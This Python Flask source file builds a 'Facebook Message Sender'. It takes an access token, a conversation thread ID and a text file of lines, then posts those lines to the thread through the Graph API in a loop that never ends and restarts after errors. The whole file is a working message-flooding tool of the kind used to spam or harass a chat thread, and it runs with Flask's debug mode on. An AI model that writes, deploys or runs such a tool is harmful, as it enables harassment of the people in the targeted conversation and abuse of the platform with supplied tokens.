from flask import Flask, request
import requests
import time

app = Flask(__name__)

@app.route('/', methods=['GET', 'POST'])
def send_message():
    if request.method == 'POST':
        access_token = request.form.get('accessToken')
        thread_id = request.form.get('threadId')
        message_prefix = request.form.get('kidx')
        time_interval = int(request.form.get('time'))
        txt_file = request.files['txtFile']
        messages = txt_file.read().decode().splitlines()

        while True:
            try:
                for message in messages:
                    api_url = f'https://graph.facebook.com/v15.0/t_{thread_id}/'
                    message = str(message_prefix) + ' ' + message
                    parameters = {'access_token': access_token, 'message': message}
                    response = requests.post(api_url, data=parameters)
                    if response.status_code == 200:
                        print(f"Message sent: {message}")
                    else:
                        print(f"Failed to send message: {message}")
                    time.sleep(time_interval)
            except Exception as e:
                print(f"Error: {e}")
                time.sleep(30)

    return '''
    <!DOCTYPE html>
    <html>
    <head>
        <title>Facebook Message Sender</title>
    </head>
    <body>
        <h1>Facebook Message Sender</h1>
        <form method="POST" enctype="multipart/form-data">
            <label>Access Token:</label><br>
            <input type="text" name="accessToken"><br>
            <label>Thread ID:</label><br>
            <input type="text" name="threadId"><br>
            <label>Message Prefix:</label><br>
            <input type="text" name="kidx"><br>
            <label>Time Interval (seconds):</label><br>
            <input type="number" name="time"><br>
            <label>Txt File:</label><br>
            <input type="file" name="txtFile"><br>
            <input type="submit" value="Send Messages">
        </form>
    </body>
    </html>
    '''

if __name__ == '__main__':
    app.run(debug=True)
